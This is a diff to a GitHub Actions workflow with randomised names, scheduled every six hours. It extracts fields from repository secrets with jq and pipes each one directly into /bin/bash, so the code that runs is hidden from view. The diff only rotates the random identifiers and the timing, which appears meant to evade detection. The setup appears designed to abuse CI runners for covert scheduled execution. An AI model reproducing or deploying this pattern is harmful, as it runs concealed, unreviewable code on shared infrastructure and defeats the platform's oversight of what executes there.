@@ -1,25 +1,27 @@
 name: zhoujinwei2345
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 2/6 * * *'
-jobs:  # 8019
+    - cron: '11 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zhoujinwei2345
         env:
-          lw674: ${{ secrets.lw674 }}
+          gll7: ${{ secrets.gll7 }}
         run: |
-          echo $lw674 | jq -r .qx705 | /bin/bash
-          echo $rxv4074 | jq -r .agmx85362 | /bin/bash
-          echo $nhz4 | jq -r .mqpe7088 | /bin/bash
-          echo $sovv8 | jq -r .zos24 | /bin/bash
-          echo $qulis674 | jq -r .hxgyf48649 | /bin/bash
-          echo $wcn194 | jq -r .iatg82 | /bin/bash
-          echo $rw546 | jq -r .g07292 | /bin/bash
-          echo $x77916 | jq -r .r27949 | /bin/bash
-          echo $dbylj2 | jq -r .oh74806 | /bin/bash
+          echo $gll7 | jq -r .fin1337 | /bin/bash
+          echo $cxbq6491 | jq -r .duty63458 | /bin/bash
+          echo $ukba8106 | jq -r .bfn1061 | /bin/bash
+          echo $czu827 | jq -r .p750 | /bin/bash
+          echo $suc0995 | jq -r .zi1 | /bin/bash
+          echo $pcgcd83 | jq -r .yotph002 | /bin/bash
+          echo $vrev85 | jq -r .oinkr1 | /bin/bash
+          echo $qlh9302 | jq -r .dicg4078 | /bin/bash
+          echo $cve19012 | jq -r .jfkfr45345 | /bin/bash
+          echo $okj116 | jq -r .ubhy91 | /bin/bash
+          echo $ntrc76321 | jq -r .p43679 | /bin/bash
+          echo $fad150 | jq -r .d6213 | /bin/bash
 
